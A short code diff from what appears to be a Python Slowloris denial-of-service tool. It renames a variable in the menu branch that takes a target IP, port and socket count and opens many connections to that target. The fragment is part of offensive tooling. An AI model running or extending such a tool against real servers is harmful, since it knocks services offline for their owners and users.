@@ -92,11 +92,11 @@ if choose == '1':
 if choose == '2':
     ip = input('')
     port = int(input(''))
-    sock = int(input(''))
+    sockk = int(input(''))
     pack = int(input(''))
     lor = Slowloris(ip, port, pack)
     list_of_sockets = []
-    for _ in range(sock):
+    for _ in range(sockk):
         try:
             sock = lor.init_socket()
         except socket.error:
